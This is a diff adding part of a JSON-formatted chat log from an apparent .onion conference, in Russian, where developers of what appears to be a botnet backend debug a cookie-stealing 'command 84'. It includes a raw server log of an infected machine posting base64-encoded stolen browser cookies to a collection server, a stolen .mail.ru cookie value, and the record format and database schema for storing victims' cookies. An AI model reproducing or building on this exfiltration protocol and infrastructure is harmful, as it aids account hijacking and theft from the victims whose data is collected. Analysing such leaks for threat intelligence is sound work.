+    },
+    "2021-08-31T08:50:53.719659": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: А сейчас логирование запросов http есть, их можно проверить?"
+    },
+    "2021-08-31T08:51:29.471232": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "есть"
+    },
+    "2021-08-31T08:52:48.117050": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Скинь тогда проблемные запросы."
+    },
+    "2021-08-31T08:58:25.520360": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<\"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\\r\\nHost: 203.76.105.227\\r\\nX-Real-IP: 203.76.105.227\\r\\nX-Forwarded-For: 203.76.105.227\\r\\nConnection: close\\r\\nContent-Length: 11059\\r\\nAccept: */*\\r\\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\\r\\nCache-Control: no-cache\\r\\n\\r\\n-----------MOBMWAMXGTKVMATK\\r\\nContent-Disposition: form-data; name=\\\"data\\\"\\r\\n\\r\\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\\r\\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\\r\\nAdministrador|C...\">>\n State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}\n ReqEmpty 0\n2021-08-31 11:52:22.416 [critical] <0.6857.3>@http_handler:handle:33 Error {badmatch,false} [{base64,decode_binary,2,[{file,\"base64.erl\"},{line,212}]},{http_handler,'-save84/3-fun-4-',5,[{file,\"src/http_handler.erl\"},{line,329}]},{lists,foreach,2,[{file,\"lists.erl\"},{line,1338}]},{http_handler,save84,3,[{file,\"src/http_handler.erl\"},{line,325}]},{http_handler,handle,2,[{file,\"src/http_handler.erl\"},{line,30}]},{cowboy_handler,handler_handle,4,[{file,\"src/cowboy_handler.erl\"},{line,111}]},{cowboy_protocol,execute,4,[{file,\"src/cowboy_protocol.erl\"},{line,443}]}]"
+    },
+    "2021-08-31T08:58:38.141862": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот . не может басе64 декодировать"
+    },
+    "2021-08-31T08:58:42.753255": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "не знаю какое поле"
+    },
+    "2021-08-31T08:59:10.718399": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "крашей больше нет"
+    },
+    "2021-08-31T08:59:29.607972": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "всмысли тех что хттп2"
+    },
+    "2021-08-31T09:05:10.043063": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Это старые данные. Сейчас модуль отправляет Username, Domain, Cookie_name, Cookie_value, Path  в В64"
+    },
+    "2021-08-31T09:05:45.411409": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[ Group, IdLow, IdHigh, base64:decode(Username), Browser, Domain, base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path) ]);\n\nвот 4 поля декодируются только"
+    },
+    "2021-08-31T09:05:49.215919": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "надо все ?"
+    },
+    "2021-08-31T09:07:35.427574": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Нужно домен ещё декодировать"
+    },
+    "2021-08-31T09:08:11.256677": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ок .. добавил в новых версиях ."
+    },
+    "2021-08-31T09:09:24.730915": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "<<\"INSERT INTO data84 (created_at, \\\"group\\\", id_low, id_high, username, browser, \\\"domain\\\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )\">> [<<\"tot138\">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<\"Firefox\">>,<<\".mail.ru\">>,<<\"mrcu\">>,<<\"14B45890605336B122FB29388502\">>,<<\"1399543312\">>,<<\"1714903312\">>,<<\"/\">>]\n2021-08-31 11:52:59.108 [error] <0.6879.3>@db:transform:58 Error {error,error,<<\"22021\">>,<<\"invalid byte sequence for encoding \\\"UTF8\\\": 0x95\">>,[]} with query {<<\"INSERT INTO data84 (created_at, \\\"group\\\", id_low, id_high, username, browser, \\\"domain\\\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )\">>,[<<\"tot138\">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<\"Firefox\">>,<<\".mail.ru\">>,<<\"mrcu\">>,<<\"14B45890605336B122FB29388502\">>,<<\"1399543312\">>,<<\"1714903312\">>,<<\"/\">>]}\n\nесть еще такое"
+    },
+    "2021-08-31T09:09:32.432028": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "на УТФ-8 не походит кодировка"
+    },
+    "2021-08-31T09:09:59.455581": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "И ещё нужно 2 поля добавить в конец записи.\nsecure, httponly\nЗначения: 0 & 1"
+    },
+    "2021-08-31T09:10:00.420547": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "насколько я понимаю это про <<149,166,247>>"
+    },
+    "2021-08-31T09:10:26.178925": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "в таблицу колонки ?"
+    },
+    "2021-08-31T09:10:55.308393": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Да, в запись поле, в таблицу колонки."
+    },
+    "2021-08-31T09:11:43.257386": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "А юникод в каком поле не проходит?"
+    },
+    "2021-08-31T09:20:09.636154": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": ",<<149,166,247>> я думаю вот это не может быть юникодом"
+    },
+    "2021-08-31T09:20:45.226606": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "юзернейм"
+    },
+    "2021-08-31T09:22:08.345041": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Похоже, пользователь. Скорее всего модуль не отправляет UTF8. Нужно проверить.\nА ты можешь в readme этот формат добавить + описание ошибок?\nМы уже много времени потратили на поиск этих ошибок из-за отсутствия описания протокола обмена."
+    },
+    "2021-08-31T09:23:06.135462": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "формат чего ?"
+    },
+    "2021-08-31T09:23:49.262733": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "в каталог doc есть некоторое описалово"
+    },
+    "2021-08-31T09:23:54.884501": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Кукисов, например. Ещё бы хорошо остальные данные проверить."
+    },
+    "2021-08-31T09:24:07.888534": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Там кукисы описаны?"
+    },
+    "2021-08-31T09:24:16.335063": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "какие кукисы ?"
+    },
+    "2021-08-31T09:24:39.286025": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Куки, печенюшки"
+    },
+    "2021-08-31T09:24:57.065045": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я понял что такое куки, но к чему ты это говоришь ?"
+    },
+    "2021-08-31T09:25:05.873569": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "1. Создать новую команду для получения данных куки. Например, код команды 84\n\n2. Создать таблицу для хранения данных (псевдокод SQL):\nCREATE TABLE cookies (\n  id SERIAL,\n  username VARCHAR(255),\n  browser VARCHAR(255)\n  domain VARCHAR(255)\n  cookie_name VARCHAR(255)\n  cookie_value VARCHAR(255)\n  created DATETIME,\n  expires DATETIME,\n  path VARCHAR(255)\n);\n\n3. Обеспечить прием данных в следующем формате:\n- простой текст, разделенный на строки.\nРазделитель строк - может быть как UNIX, так и DOS.\nОдна строка - одна запись.\nРазделитель полей в записи - вертикальная черта |\nФормат записи:\n\nusername|browser|domain|cookie_name|cookie_value|created|expires|path\\r\\n\n\nгде\n\nusername     - имя пользователя\nbrowser      - код броузера (enum = chrome|ff|ie|edge)\ndomain       - домен куки\ncookie_name  - имя куки\ncookie_value - значение куки\ncreated      - дата-время создания, Unix time\nexpires      - дата-время истечения, Unix time\npath         - путь URI"
+    },
+    "2021-08-31T09:26:49.566595": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "К тому, что у меня не было этого дока. Где описание В64? Это часть формата."
+    },
+    "2021-08-31T09:28:37.305847": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нету про базе64 .. сами добавили очевидно"
+    },
+    "2021-08-31T09:28:51.259285": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "чтобы экранировать символы"
+    },
+    "2021-08-31T09:29:50.579846": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Ну, вот это и нужно в доку добавить.\ncreated у нас в секундах?"
+    },
+    "2021-08-31T09:30:27.363742": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "created_at я ставлю сам как NOW()"
+    },
+    "2021-08-31T09:30:36.631744": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Не догадываться же, как там отстойник обрабатывает, верно?"
+    },
+    "2021-08-31T09:31:00.361505": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а .есть другой .."
+    },
+    "2021-08-31T09:31:02.580980": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "щас посмотрю"
+    },
+    "2021-08-31T09:31:21.648550": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "А NOW() в секундах?"
+    },
+    "2021-08-31T09:32:35.413827": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "забей на NOW() это другое"
+    },
+    "2021-08-31T09:36:27.499568": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "CREATE TABLE public.data84 (\n    id_low bigint NOT NULL,\n    id_high bigint NOT NULL,\n    \"group\" character varying(64),\n    created_at timestamp without time zone,\n    username text,\n    browser text,\n    domain text,\n    cookie_name text,\n    cookie_value text,\n    created text,\n    expires text,\n    path text\n);"
+    },
+    "2021-08-31T09:36:31.362123": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот таблица"
+    },
+    "2021-08-31T09:36:37.403462": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "created - просто текст"
+    },
+    "2021-08-31T09:36:41.644549": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нету про базе64 .. сами добавили очевидно \nНу, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно."
+    },
+    "2021-08-31T09:36:43.346479": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "всё - просто текст"
+    },
+    "2021-08-31T09:37:34.039517": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  \nочевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.\nкоду уже 5 лет"
+    },
+    "2021-08-31T09:39:30.947256": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Ну, это тоже не очевидно)\nПо факту ошибки посыпались. Документация не полная."
+    },
+    "2021-08-31T09:41:31.313235": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "где же ты был )"
+    },
+    "2021-08-31T10:40:22.320152": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Zulas ты под новые поля базу тоже будешь менять?\nЕсли да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены."
+    },
+    "2021-08-31T10:40:58.852427": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Я написал миграции под два поля secure и httponly"
+    },
+    "2021-08-31T10:41:19.040024": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Оба логических."
+    },
+    "2021-08-31T10:41:50.949817": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "не буду делать ."
+    },
+    "2021-08-31T10:41:53.240018": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и в 90 команду добавились новые поля"
+    },
+    "2021-08-31T10:42:06.308337": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ты базу на рабочем уже поменял ?я могу слить дамп ?"
+    },
+    "2021-08-31T10:42:24.069780": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "поля не будут сохраняться, если их больше?"
+    },
+    "2021-08-31T10:42:41.757952": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "dlls, programs, services Я тоже уже добавил"
+    },
+    "2021-08-31T10:42:55.645696": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а, ок"
+    },
+    "2021-08-31T10:42:55.697776": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Пока не накатил, сек сделаю"
+    },
+    "2021-08-31T10:44:25.979318": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию."
+    },
+    "2021-08-31T10:44:38.108248": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "И в бэке его тоже вроде как нет"
+    },
+    "2021-08-31T10:44:40.986068": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "добавляй сразу всё чтобы мне не возвращаться"
+    },
+    "2021-08-31T10:46:16.069302": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Пока не смогу. Ближе к вечеру время появится.\nТам нужно в других частях это поле добавлять, поэтому быстро не смогу сделать."
+    },
+    "2021-08-31T11:01:29.529553": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "По 2м полям в куках накатил миграции."
+    },
+    "2021-08-31T14:33:07.584222": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. \nВ бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет."
+    },
+    "2021-08-31T14:34:45.522696": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "хороший вопрос, но зуласа нету в конфе уже"
+    },
+    "2021-08-31T14:34:45.526331": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "хороший вопрос, но зуласа нету в конфе уже"
+    },
+    "2021-08-31T14:34:50.755310": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "потому повтори этот вопрос как он появится"
+    },
+    "2021-08-31T14:34:50.757702": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "потому повтори этот вопрос как он появится"
+    },
+    "2021-08-31T14:35:16.319715": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Оке, тут получается нет истории.."
+    },
+    "2021-08-31T14:35:52.752119": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "неа"
+    },
+    "2021-08-31T14:35:52.755543": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "неа"
+    },
+    "2021-09-02T11:40:03.475571": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "потом когда конфа будет не актуальна звездочку снимите"
+    },
+    "2021-09-02T11:40:03.476572": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": " > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. \nВ бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.\n\nдля начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?"
+    },
+    "2021-09-02T11:40:03.477426": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "oad"
+    },
+    "2021-09-02T11:40:03.478257": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "К сожалению не можем.\nЕсли с этим серверм будет такое же история я напишу"
+    },
+    "2021-09-02T11:40:03.479115": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Как повторить к сожалению не знаю пока"
+    },
+    "2021-09-02T11:40:03.479960": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "всем привет"
+    },
+    "2021-09-02T11:40:03.481066": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "как дела с деро?"
+    },
+    "2021-09-02T11:40:03.481830": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: понятна проблема?"
+    },
+    "2021-09-02T11:40:03.482359": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "деф . привет .. а в чем проблема ?"
+    },
+    "2021-09-02T11:40:03.483244": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "driver: отпиши что ты мне написал сюда"
+    },
+    "2021-09-02T11:40:03.484198": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ответ 403 был"
+    },
+    "2021-09-02T11:40:03.484930": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "с ним разобрались?"
+    },
+    "2021-09-02T11:40:03.485901": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Бэк отвечает 403 на попытку отправить куки."
+    },
+    "2021-09-02T11:40:03.486747": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Внесли ли изменения связанные с новыми полями?"
+    },
+    "2021-09-02T11:40:03.487800": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "давайте конкретно: кто и что должен внести?"
+    },
+    "2021-09-02T11:40:03.488484": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "тк походу зулас даже не в курсе"
+    },
+    "2021-09-02T11:40:03.489185": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "4ый день мы тут что то обсуждаем, а в итоге ничего не делаем"
+    },
+    "2021-09-02T11:40:03.490286": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "в чем проблема?"
+    },
+    "2021-09-02T11:40:03.490703": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Нужно в 84 команду внести 2 поля.\nsecure, httponly в конец приема, получается 9 и 10 поле должно быть."
+    },
+    "2021-09-02T11:40:03.491918": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "В базу должны записываться поля с такими же именами"
+    },
+    "2021-09-02T11:41:12.881216": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я ничего не вносил пока .."
+    },
+    "2021-09-02T11:41:48.444791": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "так уже пора внести"
+    },
+    "2021-09-02T11:41:48.448786": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так уже пора внести"
+    },
+    "2021-09-02T11:41:53.191108": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "драйвер же просил"
+    },
+    "2021-09-02T11:41:53.195192": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "драйвер же просил"
+    },
+    "2021-09-02T11:42:05.651449": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "у нас доработка прямо сейчас в модуле сбора, требует этого"
+    },
+    "2021-09-02T11:42:05.654709": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "у нас доработка прямо сейчас в модуле сбора, требует этого"
+    },
+    "2021-09-02T11:42:10.209571": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Ок. Когда?"
+    },
+    "2021-09-02T11:43:37.294432": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Я не стал этого делать потому что мне сказали, что сейчас zulas занимается бэком, но я напрямую не писал задачу.\nВозможно решил что вы с кодером модуля обсудили этот момент"
+    },
+    "2021-09-02T11:44:33.237267": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "(31.08.2021 13:44:35) zulas: добавляй сразу всё чтобы мне не возвращаться\n(31.08.2021 13:46:11) driver: Пока не смогу. Ближе к вечеру время появится.\nТам нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.\n(31.08.2021 14:01:24) driver: По 2м полям в куках накатил миграции."
+    },
+    "2021-09-02T11:44:45.185319": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну вообще надо все сразу сделать и чтобы не возвращаться"
+    },
+    "2021-09-02T11:44:52.285203": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "переключение контекста -- очень тяжелая операция )"
+    },
+    "2021-09-02T11:45:14.306121": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так что \n1. я жду когда в базу нужное внесется\n2. когда мне будет объяснено что нужно делать"
+    },
+    "2021-09-02T11:59:16.908092": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "так а по-моему driver говорил что накатил миграции на базу. Это не оно?\nцитату не приведу, уплыло в истории"
+    },
+    "2021-09-02T11:59:16.915112": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
